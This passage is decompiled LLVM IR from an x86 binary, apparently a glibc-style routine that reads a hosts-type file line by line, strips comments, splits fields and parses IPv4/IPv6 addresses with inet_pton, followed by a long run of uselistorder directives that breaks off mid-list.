dec_label_pc_8054757.outer:                       ; preds = %dec_label_pc_805472f, %dec_label_pc_8054736, %dec_label_pc_8054714, %dec_label_pc_8054641
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_8054641 ], [ 2, %dec_label_pc_8054714 ], [ 2, %dec_label_pc_8054736 ], [ 2, %dec_label_pc_805472f ]
  br label %dec_label_pc_8054757

dec_label_pc_8054658:                             ; preds = %dec_label_pc_8054757
  %v3_8054660 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8054660, i32* @eax, align 4
  %v1_8054668 = icmp eq i32 %v3_8054660, 0
  br i1 %v1_8054668, label %dec_label_pc_805466f, label %dec_label_pc_805466c

dec_label_pc_805466c:                             ; preds = %dec_label_pc_8054658
  %v1_805466c = inttoptr i32 %v3_8054660 to i8*
  store i8 0, i8* %v1_805466c, align 1
  br label %dec_label_pc_805466f

dec_label_pc_805466f:                             ; preds = %dec_label_pc_8054658, %dec_label_pc_805466c
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_80546af34 = load i8, i8* %stack_var_-20.0, align 1
  %v3_80546af35 = icmp eq i8 %v2_80546af34, 0
  %v1_80546b241 = icmp eq i1 %v3_80546af35, false
  br i1 %v1_80546b241, label %dec_label_pc_805467b.preheader.preheader, label %dec_label_pc_80546b4

dec_label_pc_805467b.preheader.preheader:         ; preds = %dec_label_pc_805466f
  %v4_805467b98.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805467b.preheader

dec_label_pc_8054677:                             ; preds = %dec_label_pc_8054681
  store i8 0, i8* %v1_805467b104, align 1
  %v0_805467a = load i32, i32* @ecx, align 4
  %v1_805467a = add i32 %v0_805467a, 1
  store i32 %v1_805467a, i32* @ecx, align 4
  %v1_805467b = inttoptr i32 %v1_805467a to i8*
  %v2_805467b = load i8, i8* %v1_805467b, align 1
  %v3_805467b = zext i8 %v2_805467b to i32
  %v4_805467b = load i32, i32* %eax.global-to-local, align 4
  %v5_805467b = and i32 %v4_805467b, -256
  %v6_805467b = or i32 %v5_805467b, %v3_805467b
  store i32 %v6_805467b, i32* @eax, align 4
  %v4_805467d = icmp eq i8 %v2_805467b, 0
  br i1 %v4_805467d, label %dec_label_pc_805467b.dec_label_pc_80546b4.loopexit_crit_edge, label %dec_label_pc_8054681

dec_label_pc_8054681:                             ; preds = %dec_label_pc_805467b.preheader, %dec_label_pc_8054677
  %v2_805467b105 = phi i8 [ %v2_805467b, %dec_label_pc_8054677 ], [ %v2_805467b96, %dec_label_pc_805467b.preheader ]
  %v1_805467b104 = phi i8* [ %v1_805467b, %dec_label_pc_8054677 ], [ %v1_805467b95, %dec_label_pc_805467b.preheader ]
  %v0_8054677103 = phi i32 [ %v1_805467a, %dec_label_pc_8054677 ], [ %v0_805467b49, %dec_label_pc_805467b.preheader ]
  %v2_8054681 = sext i8 %v2_805467b105 to i32
  store i32 %v2_8054681, i32* @edx, align 4
  %v0_8054684 = load i32, i32* @global_var_8059dd8, align 8
  store i32 %v0_8054684, i32* %eax.global-to-local, align 4
  %v2_8054689 = mul nsw i32 %v2_8054681, 2
  %v3_8054689 = add i32 %v0_8054684, %v2_8054689
  %v4_8054689 = inttoptr i32 %v3_8054689 to i8*
  %v5_8054689 = load i8, i8* %v4_8054689, align 1
  %v6_8054689 = and i8 %v5_8054689, 32
  %v7_8054689 = icmp eq i8 %v6_8054689, 0
  %v1_805468d = icmp eq i1 %v7_8054689, false
  br i1 %v1_805468d, label %dec_label_pc_8054677, label %dec_label_pc_805468f

dec_label_pc_805468f:                             ; preds = %dec_label_pc_8054681
  %v0_805468f = load i32, i32* @edi, align 4
  %v1_805468f = add i32 %v0_805468f, -6
  %v6_805468f = sub i32 5, %v0_805468f
  %v7_805468f = and i32 %v6_805468f, %v0_805468f
  %v8_805468f = icmp slt i32 %v7_805468f, 0
  %v9_805468f = icmp eq i32 %v1_805468f, 0
  %v10_805468f = icmp slt i32 %v1_805468f, 0
  %v3_8054692 = icmp eq i1 %v10_805468f, %v8_805468f
  %v4_8054692 = icmp eq i1 %v9_805468f, false
  %v5_8054692 = and i1 %v4_8054692, %v3_8054692
  br i1 %v5_8054692, label %dec_label_pc_805469b.preheader, label %dec_label_pc_8054694

dec_label_pc_8054694:                             ; preds = %dec_label_pc_805468f
  %v1_8054694 = load i32, i32* @ebx, align 4
  %v3_8054694 = mul i32 %v0_805468f, 4
  %v4_8054694 = add i32 %v1_8054694, %v3_8054694
  %v5_8054694 = inttoptr i32 %v4_8054694 to i32*
  store i32 %v0_8054677103, i32* %v5_8054694, align 4
  %v0_8054697 = load i32, i32* @edi, align 4
  %v1_8054697 = add i32 %v0_8054697, 1
  store i32 %v1_8054697, i32* @edi, align 4
  %v0_805469b.pre.pre = load i32, i32* @ecx, align 4
  %v4_805469b.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805469b.preheader

dec_label_pc_805469b.preheader:                   ; preds = %dec_label_pc_8054694, %dec_label_pc_805468f
  %v4_805469b.pre = phi i32 [ %v4_805469b.pre.pre, %dec_label_pc_8054694 ], [ %v0_8054684, %dec_label_pc_805468f ]
  %v0_805469b.pre = phi i32 [ %v0_805469b.pre.pre, %dec_label_pc_8054694 ], [ %v0_8054677103, %dec_label_pc_805468f ]
  %v0_80546b454 = phi i32 [ %v1_8054697, %dec_label_pc_8054694 ], [ %v0_805468f, %dec_label_pc_805468f ]
  %v1_805469b106 = inttoptr i32 %v0_805469b.pre to i8*
  %v2_805469b107 = load i8, i8* %v1_805469b106, align 1
  %v3_805469b108 = zext i8 %v2_805469b107 to i32
  %v5_805469b109 = and i32 %v4_805469b.pre, -256
  %v6_805469b110 = or i32 %v3_805469b108, %v5_805469b109
  store i32 %v6_805469b110, i32* @eax, align 4
  %v4_805469d111 = icmp eq i8 %v2_805469b107, 0
  br i1 %v4_805469d111, label %dec_label_pc_80546af.loopexit, label %dec_label_pc_80546a1.lr.ph

dec_label_pc_80546a1.lr.ph:                       ; preds = %dec_label_pc_805469b.preheader
  %v0_80546a4.pre = load i32, i32* @global_var_8059dd8, align 8
  br label %dec_label_pc_80546a1

dec_label_pc_805469a:                             ; preds = %dec_label_pc_80546a1
  %v1_805469a = add i32 %v0_80546af113, 1
  store i32 %v1_805469a, i32* @ecx, align 4
  %v1_805469b = inttoptr i32 %v1_805469a to i8*
  %v2_805469b = load i8, i8* %v1_805469b, align 1
  %v3_805469b = zext i8 %v2_805469b to i32
  %v5_805469b = and i32 %v0_80546a4.pre, -256
  %v6_805469b = or i32 %v3_805469b, %v5_805469b
  store i32 %v6_805469b, i32* @eax, align 4
  %v4_805469d = icmp eq i8 %v2_805469b, 0
  br i1 %v4_805469d, label %dec_label_pc_80546af.loopexit, label %dec_label_pc_80546a1

dec_label_pc_80546a1:                             ; preds = %dec_label_pc_80546a1.lr.ph, %dec_label_pc_805469a
  %v2_805469b115 = phi i8 [ %v2_805469b107, %dec_label_pc_80546a1.lr.ph ], [ %v2_805469b, %dec_label_pc_805469a ]
  %v1_805469b114 = phi i8* [ %v1_805469b106, %dec_label_pc_80546a1.lr.ph ], [ %v1_805469b, %dec_label_pc_805469a ]
  %v0_80546af113 = phi i32 [ %v0_805469b.pre, %dec_label_pc_80546a1.lr.ph ], [ %v1_805469a, %dec_label_pc_805469a ]
  %v2_80546a1 = sext i8 %v2_805469b115 to i32
  store i32 %v2_80546a1, i32* @edx, align 4
  store i32 %v0_80546a4.pre, i32* @eax, align 4
  %v2_80546a9 = mul nsw i32 %v2_80546a1, 2
  %v3_80546a9 = add i32 %v0_80546a4.pre, %v2_80546a9
  %v4_80546a9 = inttoptr i32 %v3_80546a9 to i8*
  %v5_80546a9 = load i8, i8* %v4_80546a9, align 1
  %v6_80546a9 = and i8 %v5_80546a9, 32
  %v7_80546a9 = icmp eq i8 %v6_80546a9, 0
  br i1 %v7_80546a9, label %dec_label_pc_805469a, label %dec_label_pc_80546af.loopexit

dec_label_pc_80546af.loopexit:                    ; preds = %dec_label_pc_80546a1, %dec_label_pc_805469a, %dec_label_pc_805469b.preheader
  %v4_805467b98139 = phi i32 [ %v6_805469b110, %dec_label_pc_805469b.preheader ], [ %v6_805469b, %dec_label_pc_805469a ], [ %v0_80546a4.pre, %dec_label_pc_80546a1 ]
  %v0_80546af.lcssa = phi i32 [ %v0_805469b.pre, %dec_label_pc_805469b.preheader ], [ %v1_805469a, %dec_label_pc_805469a ], [ %v0_80546af113, %dec_label_pc_80546a1 ]
  %v1_805469b.lcssa = phi i8* [ %v1_805469b106, %dec_label_pc_805469b.preheader ], [ %v1_805469b, %dec_label_pc_805469a ], [ %v1_805469b114, %dec_label_pc_80546a1 ]
  %v2_80546af = load i8, i8* %v1_805469b.lcssa, align 1
  %v3_80546af = icmp eq i8 %v2_80546af, 0
  %v1_80546b2 = icmp eq i1 %v3_80546af, false
  br i1 %v1_80546b2, label %dec_label_pc_805467b.preheader, label %dec_label_pc_80546b4

dec_label_pc_805467b.preheader:                   ; preds = %dec_label_pc_805467b.preheader.preheader, %dec_label_pc_80546af.loopexit
  %v0_80546b4.pre142 = phi i32 [ %v0_80546b454, %dec_label_pc_80546af.loopexit ], [ 0, %dec_label_pc_805467b.preheader.preheader ]
  %v4_805467b98 = phi i32 [ %v4_805467b98139, %dec_label_pc_80546af.loopexit ], [ %v4_805467b98.pre, %dec_label_pc_805467b.preheader.preheader ]
  %v0_805467b49 = phi i32 [ %v0_80546af.lcssa, %dec_label_pc_80546af.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_805467b.preheader.preheader ]
  %v1_805467b95 = inttoptr i32 %v0_805467b49 to i8*
  %v2_805467b96 = load i8, i8* %v1_805467b95, align 1
  %v3_805467b97 = zext i8 %v2_805467b96 to i32
  %v5_805467b99 = and i32 %v4_805467b98, -256
  %v6_805467b100 = or i32 %v5_805467b99, %v3_805467b97
  store i32 %v6_805467b100, i32* @eax, align 4
  %v4_805467d101 = icmp eq i8 %v2_805467b96, 0
  br i1 %v4_805467d101, label %dec_label_pc_80546b4, label %dec_label_pc_8054681

dec_label_pc_805467b.dec_label_pc_80546b4.loopexit_crit_edge: ; preds = %dec_label_pc_8054677
  %v0_80546b4.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80546b4

dec_label_pc_80546b4:                             ; preds = %dec_label_pc_80546af.loopexit, %dec_label_pc_805467b.dec_label_pc_80546b4.loopexit_crit_edge, %dec_label_pc_805467b.preheader, %dec_label_pc_805466f
  %v1_80546b7 = phi i32 [ 0, %dec_label_pc_805466f ], [ %v0_80546b4.pre.pre, %dec_label_pc_805467b.dec_label_pc_80546b4.loopexit_crit_edge ], [ %v0_80546b4.pre142, %dec_label_pc_805467b.preheader ], [ %v0_80546b454, %dec_label_pc_80546af.loopexit ]
  %v0_80546b7 = load i32, i32* @ebx, align 4
  %v2_80546b7 = mul i32 %v1_80546b7, 4
  %v3_80546b7 = add i32 %v0_80546b7, %v2_80546b7
  %v4_80546b7 = inttoptr i32 %v3_80546b7 to i32*
  store i32 0, i32* %v4_80546b7, align 4
  %v7_80546be = icmp sgt i32 %v1_80546b7, 1
  br i1 %v7_80546be, label %dec_label_pc_80546c4, label %dec_label_pc_8054757

dec_label_pc_80546c4:                             ; preds = %dec_label_pc_80546b4
  br i1 %v12_80544f6, label %dec_label_pc_8054791, label %dec_label_pc_80546cf

dec_label_pc_80546cf:                             ; preds = %dec_label_pc_80546c4
  store i32 1, i32* @esi, align 4
  br i1 %v1_80546d9, label %dec_label_pc_8054707.preheader, label %dec_label_pc_80546db

dec_label_pc_8054707.preheader:                   ; preds = %dec_label_pc_80546cf
  %v1_8054707119 = load i32, i32* @edi, align 4
  %v5_8054709128 = icmp sgt i32 %v1_8054707119, 1
  br i1 %v5_8054709128, label %dec_label_pc_80546f1.lr.ph, label %dec_label_pc_8054757

dec_label_pc_80546f1.lr.ph:                       ; preds = %dec_label_pc_8054707.preheader
  br label %dec_label_pc_80546f1

dec_label_pc_80546db:                             ; preds = %dec_label_pc_80546cf
  %v0_80546db = load i32, i32* @eax, align 4
  %v0_80546dd = load i32, i32* @ebx, align 4
  %v1_80546dd = inttoptr i32 %v0_80546dd to i32*
  %v2_80546dd = load i32, i32* %v1_80546dd, align 4
  %v5_80546e3 = call i32 @__GI_strcoll(i8* %v2_80546fa, i32 %v2_80546dd, i32 %v0_80546db, i32 %v0_80546db)
  store i32 %v5_80546e3, i32* %eax.global-to-local, align 4
  %v1_80546eb = icmp eq i32 %v5_80546e3, 0
  %v1_80546ed = icmp eq i1 %v1_80546eb, false
  br i1 %v1_80546ed, label %dec_label_pc_8054757, label %dec_label_pc_805470d

dec_label_pc_80546f1:                             ; preds = %dec_label_pc_80546f1.lr.ph, %dec_label_pc_8054706
  %v1_80546f3129 = phi i32 [ 1, %dec_label_pc_80546f1.lr.ph ], [ %v1_8054706, %dec_label_pc_8054706 ]
  %v0_80546f3 = load i32, i32* @ebx, align 4
  %v2_80546f3 = mul i32 %v1_80546f3129, 4
  %v3_80546f3 = add i32 %v0_80546f3, %v2_80546f3
  %v4_80546f3 = inttoptr i32 %v3_80546f3 to i32*
  %v5_80546f3 = load i32, i32* %v4_80546f3, align 4
  %v3_80546fa = call i32 @__GI_strcasecmp(i8* %v2_80546fa, i32 %v5_80546f3)
  store i32 %v3_80546fa, i32* %eax.global-to-local, align 4
  %v1_8054702 = icmp eq i32 %v3_80546fa, 0
  br i1 %v1_8054702, label %dec_label_pc_805470d, label %dec_label_pc_8054706

dec_label_pc_8054706:                             ; preds = %dec_label_pc_80546f1
  %v0_8054706 = load i32, i32* @esi, align 4
  %v1_8054706 = add i32 %v0_8054706, 1
  store i32 %v1_8054706, i32* @esi, align 4
  %v1_8054707 = load i32, i32* @edi, align 4
  %v5_8054709 = icmp slt i32 %v1_8054706, %v1_8054707
  br i1 %v5_8054709, label %dec_label_pc_80546f1, label %dec_label_pc_8054757

dec_label_pc_805470d:                             ; preds = %dec_label_pc_80546db, %dec_label_pc_80546f1
  br i1 %v1_8054712, label %dec_label_pc_805472f, label %dec_label_pc_8054714

dec_label_pc_8054714:                             ; preds = %dec_label_pc_805470d
  %v0_8054714 = load i32, i32* @esi, align 4
  %v3_8054715 = load i8*, i8** %stack_var_-44, align 4
  %v4_8054715 = ptrtoint i8* %v3_8054715 to i32
  %v0_8054719 = load i32, i32* @ebx, align 4
  %v1_8054719 = inttoptr i32 %v0_8054719 to i32*
  %v2_8054719 = load i32, i32* %v1_8054719, align 4
  %v4_805471d = inttoptr i32 %v2_8054719 to i8*
  %v5_805471d = call i32 @inet_pton(i32 2, i8* %v4_805471d, i32 %v4_8054715, i32 %v0_8054714)
  store i32 %v5_805471d, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_805471d, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_80545ad, label %dec_label_pc_8054757.outer

dec_label_pc_805472f:                             ; preds = %dec_label_pc_805470d
  br i1 %v1_8054734, label %dec_label_pc_8054757.outer, label %dec_label_pc_8054736

dec_label_pc_8054736:                             ; preds = %dec_label_pc_805472f
  %v0_8054736 = load i32, i32* @ecx, align 4
  %v0_805473b = load i32, i32* @ebx, align 4
  %v1_805473b = inttoptr i32 %v0_805473b to i32*
  %v2_805473b = load i32, i32* %v1_805473b, align 4
  %v4_805473f = inttoptr i32 %v2_805473b to i8*
  %v5_805473f = call i32 @inet_pton(i32 10, i8* %v4_805473f, i32 %stack_var_-36.0, i32 %v0_8054736)
  store i32 %v5_805473f, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_805473f, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_80545da, label %dec_label_pc_8054757.outer

dec_label_pc_8054757:                             ; preds = %dec_label_pc_8054707.preheader, %dec_label_pc_8054706, %dec_label_pc_80546b4, %dec_label_pc_80546db, %dec_label_pc_8054757.outer
  %v0_8054757 = load i32, i32* @edx, align 4
  %v3_8054761 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_8054757)
  store i32 %v3_8054761, i32* @eax, align 4
  %v1_8054769 = icmp eq i32 %v3_8054761, 0
  %v1_805476b = icmp eq i1 %v1_8054769, false
  br i1 %v1_805476b, label %dec_label_pc_8054658, label %dec_label_pc_8054771

dec_label_pc_8054771:                             ; preds = %dec_label_pc_8054757, %dec_label_pc_8054606
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8054606 ], [ %stack_var_-28.0.ph, %dec_label_pc_8054757 ]
  br i1 %v12_80544f6, label %dec_label_pc_8054791, label %dec_label_pc_8054778

dec_label_pc_8054778:                             ; preds = %dec_label_pc_8054771
  %v1_805477f = inttoptr i32 %stack_var_4.0 to i16*
  %v2_805477f = call i32 @__GI_fclose(i16* %v1_805477f)
  store i32 %v2_805477f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054791

dec_label_pc_8054791:                             ; preds = %dec_label_pc_80546c4, %dec_label_pc_80544e1, %dec_label_pc_80544ed, %dec_label_pc_805450b, %dec_label_pc_805451e, %dec_label_pc_805452a, %dec_label_pc_8054533, %dec_label_pc_805455d, %dec_label_pc_8054771, %dec_label_pc_8054778, %dec_label_pc_8054593
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8054771 ], [ %stack_var_-28.1, %dec_label_pc_8054778 ], [ %v2_80545a2, %dec_label_pc_8054593 ], [ 34, %dec_label_pc_805455d ], [ 34, %dec_label_pc_8054533 ], [ 34, %dec_label_pc_805452a ], [ 34, %dec_label_pc_805451e ], [ 34, %dec_label_pc_805450b ], [ 34, %dec_label_pc_80544ed ], [ 34, %dec_label_pc_80544e1 ], [ %stack_var_-28.0.ph, %dec_label_pc_80546c4 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_80544cc, i32* @ebx, align 4
  store i32 %v0_80544cb, i32* @esi, align 4
  store i32 %v0_80544ca, i32* @edi, align 4
  store i32 %v0_80544c9, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_8054706, { 0, 2, 1 }
  uselistorder i32 %v1_80546b7, { 1, 0 }
  uselistorder i8 %v2_805467b96, { 1, 2, 0 }
  uselistorder i8* %v1_805467b95, { 1, 0 }
  uselistorder i32 %v0_805467b49, { 1, 0 }
  uselistorder i32 %v2_80546a1, { 1, 0 }
  uselistorder i32 %v1_805469a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80546a4.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_805468f, { 1, 0 }
  uselistorder i32 %v0_805468f, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8054681, { 1, 0 }
  uselistorder i8* %v2_80546fa, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805453f, { 2, 1, 0, 3 }
  uselistorder i32 %v0_805451e, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80544fb, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8054502, { 1, 0 }
  uselistorder i32 %v1_80544dc, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 11, 13, 12, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 11, 12, 13, 14, 10, 0, 1, 16, 17, 15, 9 }
  uselistorder i32 (i16*)* @__GI_fclose, { 3, 4, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 5, { 14, 25, 26, 27, 0, 13, 7, 8, 18, 9, 28, 29, 1, 3, 22, 15, 23, 24, 10, 6, 19, 5, 20, 4, 21, 11, 12, 16, 17, 2 }
  uselistorder i32 -6, { 1, 0, 2 }
  uselistorder i8 32, { 20, 21, 22, 23, 24, 16, 0, 7, 17, 13, 14, 15, 8, 25, 18, 19, 26, 27, 2, 11, 3, 9, 1, 12, 4, 10, 5, 6 }
  uselistorder i32* @global_var_8059dd8, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 -256, { 1, 71, 0, 72, 12, 19, 73, 75, 3, 37, 36, 2, 76, 77, 6, 78, 4, 79, 5, 80, 90, 8, 39, 38, 7, 53, 54, 81, 55, 56, 57, 58, 59, 60, 13, 61, 87, 88, 92, 14, 26, 15, 93, 94, 85, 84, 9, 25, 74, 82, 62, 63, 64, 65, 66, 67, 68, 10, 69, 70, 83, 20, 21, 22, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 16, 17, 18, 11, 86, 89, 91 }
  uselistorder i32 35, { 0, 2, 1 }
  uselistorder i32 10, { 19, 0, 27, 28, 29, 30, 31, 32, 1, 11, 20, 2, 7, 33, 8, 9, 10, 21, 3, 13, 25, 26, 12, 35, 22, 4, 18, 17, 14, 15, 6, 34, 23, 24, 16, 5 }
  uselistorder i32 12, { 74, 75, 76, 0, 77, 16, 39, 1, 78, 93, 23, 21, 6, 22, 7, 8, 9, 10, 11, 12, 13, 79, 57, 58, 59, 60, 61, 62, 63, 64, 2, 17, 18, 65, 66, 67, 127, 25, 40, 73, 92, 41, 42, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 43, 44, 45, 46, 47, 48, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 24, 126, 82, 83, 84, 85, 128, 68, 3, 4, 69, 70, 14, 15, 71, 5, 80, 81, 49, 50, 51, 52, 53, 19, 54, 55, 20, 56, 72, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 86, 87, 88, 89, 90, 91 }
  uselistorder i32 80, { 0, 4, 5, 6, 7, 8, 9, 10, 1, 2, 3 }
  uselistorder i32 56, { 6, 5, 11, 0, 12, 13, 14, 15, 2, 8, 3, 9, 4, 1, 16, 10, 7 }
  uselistorder i32 44, { 8, 9, 10, 5, 0, 6, 7, 20, 12, 4, 17, 19, 18, 14, 15, 16, 13, 11, 1, 2, 3 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 19, 20, 2, 21, 3, 4, 22, 14, 6, 7, 8, 9, 10, 5, 0, 1 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 14, 16, 17, 0, 7, 4, 1, 9, 5, 6, 10, 11, 12, 13, 3, 2, 15, 8 }
  uselistorder i32 -48, { 2, 3, 4, 1, 0 }
  uselistorder i32 16, { 86, 85, 0, 87, 88, 13, 8, 89, 14, 90, 52, 53, 98, 99, 100, 101, 102, 103, 110, 104, 105, 106, 107, 108, 109, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 91, 92, 93, 94, 54, 55, 56, 57, 58, 59, 60, 61, 131, 15, 16, 28, 19, 42, 29, 37, 82, 38, 135, 1, 39, 40, 41, 3, 2, 129, 5, 4, 130, 7, 6, 121, 122, 17, 136, 95, 96, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 20, 77, 78, 79, 80, 132, 133, 134, 97, 12, 9, 27, 21, 43, 44, 45, 46, 47, 48, 49, 50, 51, 18, 22, 81, 30, 31, 32, 33, 34, 35, 36, 83, 84, 11, 23, 123, 124, 125, 126, 127, 24, 128, 10, 25, 26 }
  uselistorder i32 8, { 123, 122, 124, 0, 1, 125, 126, 127, 128, 129, 130, 7, 131, 2, 16, 132, 133, 134, 135, 32, 136, 90, 36, 18, 19, 20, 21, 37, 22, 23, 38, 39, 24, 40, 25, 41, 42, 138, 91, 92, 93, 94, 95, 96, 34, 33, 97, 98, 99, 100, 199, 200, 201, 29, 207, 30, 208, 31, 46, 26, 67, 121, 151, 68, 69, 153, 154, 155, 156, 157, 158, 159, 8, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 9, 70, 71, 72, 73, 74, 75, 76, 77, 170, 171, 172, 173, 174, 44, 10, 45, 11, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 43, 192, 193, 12, 194, 195, 196, 197, 13, 198, 145, 146, 3, 206, 101, 139, 140, 4, 5, 47, 102, 103, 104, 105, 107, 108, 109, 106, 110, 111, 112, 113, 27, 28, 114, 115, 116, 117, 118, 119, 202, 203, 204, 141, 142, 143, 144, 137, 205, 78, 6, 79, 80, 35, 81, 82, 83, 84, 85, 86, 87, 88, 89, 120, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 17, 147, 148, 149, 150, 152, 15, 14 }
  uselistorder i32 -36, { 1, 0 }
  uselistorder i32 -32, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 32, { 71, 0, 72, 73, 28, 30, 78, 29, 79, 80, 81, 42, 43, 60, 85, 31, 51, 53, 54, 55, 56, 5, 4, 6, 7, 44, 8, 9, 52, 10, 11, 12, 13, 14, 1, 76, 74, 75, 61, 62, 2, 63, 64, 65, 66, 67, 68, 69, 15, 70, 45, 83, 84, 77, 82, 57, 58, 59, 33, 16, 46, 47, 17, 48, 3, 19, 18, 34, 35, 49, 36, 20, 21, 23, 22, 37, 25, 24, 38, 40, 27, 26, 39, 41, 32, 50 }
  uselistorder i32 4, { 261, 262, 263, 257, 255, 256, 258, 259, 260, 0, 5, 264, 265, 266, 267, 268, 269, 270, 271, 272, 33, 54, 146, 147, 148, 34, 35, 36, 273, 49, 1, 187, 6, 7, 202, 203, 204, 205, 206, 207, 274, 275, 278, 279, 280, 281, 282, 283, 59, 284, 290, 291, 292, 68, 37, 293, 294, 295, 296, 38, 39, 40, 69, 41, 42, 70, 43, 297, 44, 298, 71, 45, 72, 73, 8, 285, 286, 74, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 55, 218, 369, 219, 370, 371, 377, 378, 383, 384, 385, 372, 50, 94, 161, 162, 373, 374, 375, 376, 9, 149, 150, 151, 152, 75, 242, 243, 244, 60, 309, 310, 311, 312, 153, 154, 155, 156, 157, 61, 10, 158, 159, 379, 381, 323, 324, 325, 326, 327, 328, 11, 329, 330, 331, 332, 333, 334, 335, 336, 321, 322, 163, 46, 164, 165, 166, 167, 168, 169, 170, 12, 172, 171, 337, 52, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 31, 358, 359, 53, 360, 13, 160, 380, 173, 174, 299, 300, 51, 301, 302, 303, 304, 2, 14, 3, 382, 15, 175, 220, 16, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 47, 48, 95, 76, 238, 239, 240, 287, 288, 56, 289, 276, 277, 77, 176, 177, 178, 17, 179, 18, 32, 19, 20, 180, 181, 21, 182, 78, 183, 79, 184, 80, 185, 81, 186, 188, 189, 190, 57, 191, 192, 193, 62, 63, 64, 194, 82, 83, 84, 85, 86, 65, 195, 87, 196, 66, 197, 198, 58, 199, 200, 201, 67, 241, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 92, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 88, 305, 306, 307, 308, 313, 22, 23, 314, 24, 89, 90, 93, 315, 91, 25, 26, 316, 317, 318, 319, 27, 4, 28, 29, 320, 30, 361, 362, 363, 364, 365, 366, 367, 368, 386, 387, 388, 145 }
  uselistorder i32* @ebp, { 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 9, 10, 11, 12, 13, 14, 15, 2, 86, 87, 88, 93, 89, 90, 91, 92, 94, 34, 35, 95, 99, 110, 111, 141, 142, 143, 36, 37, 38, 39, 40, 221, 16, 17, 18, 69, 70, 192, 193, 194, 195, 196, 19, 20, 197, 198, 199, 200, 201, 202, 203, 204, 209, 205, 206, 207, 208, 1, 210, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 4, 41, 42, 43, 44, 45, 105, 0, 106, 107, 108, 109, 100, 101, 102, 103, 104, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 3, 62, 6, 7, 8, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 63, 64, 65, 96, 97, 98, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 66, 67, 68, 5, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 179, 180, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 211, 212, 213, 214, 217, 